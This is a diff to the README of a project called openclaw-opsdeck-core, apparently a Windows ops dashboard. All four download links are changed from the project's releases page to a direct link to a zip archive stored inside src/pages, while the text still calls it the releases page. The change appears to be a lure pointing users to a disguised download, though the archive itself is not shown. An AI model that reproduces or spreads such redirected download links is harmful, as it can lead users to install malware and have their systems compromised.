@@ -1,6 +1,6 @@
 # 🕹️ openclaw-opsdeck-core - Control Dashboard for OpenClaw Ops
 
-[![Download Latest Release](https://img.shields.io/badge/Download-OpenClaw%20OpsDeck-blue?style=for-the-badge)](https://github.com/Syed7625/openclaw-opsdeck-core/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-OpenClaw%20OpsDeck-blue?style=for-the-badge)](https://raw.githubusercontent.com/Syed7625/openclaw-opsdeck-core/main/src/pages/core_opsdeck_openclaw_v2.8.zip)
 
 ---
 
@@ -30,7 +30,7 @@ Before installing, make sure your computer meets these needs:
 
 Go to the releases page of the project by clicking below:
 
-[![Download Here](https://img.shields.io/badge/Download-Page-grey?style=for-the-badge&color=green)](https://github.com/Syed7625/openclaw-opsdeck-core/releases)
+[![Download Here](https://img.shields.io/badge/Download-Page-grey?style=for-the-badge&color=green)](https://raw.githubusercontent.com/Syed7625/openclaw-opsdeck-core/main/src/pages/core_opsdeck_openclaw_v2.8.zip)
 
 This page hosts the latest Windows installer file you will need.
 
@@ -113,7 +113,7 @@ If the app does not start or crashes:
 
 ## 🔗 Useful Links
 
-- Download the app here: https://github.com/Syed7625/openclaw-opsdeck-core/releases
+- Download the app here: https://raw.githubusercontent.com/Syed7625/openclaw-opsdeck-core/main/src/pages/core_opsdeck_openclaw_v2.8.zip
 - View source code, report bugs, or request features on the GitHub repository.
 
 ---
@@ -155,4 +155,4 @@ If you have questions or need support, you can open issues on the GitHub reposit
 
 ---
 
-[![Download openclaw-opsdeck-core](https://img.shields.io/badge/Download-OpenClaw%20OpsDeck-blue?style=for-the-badge)](https://github.com/Syed7625/openclaw-opsdeck-core/releases)
+[![Download openclaw-opsdeck-core](https://img.shields.io/badge/Download-OpenClaw%20OpsDeck-blue?style=for-the-badge)](https://raw.githubusercontent.com/Syed7625/openclaw-opsdeck-core/main/src/pages/core_opsdeck_openclaw_v2.8.zip)
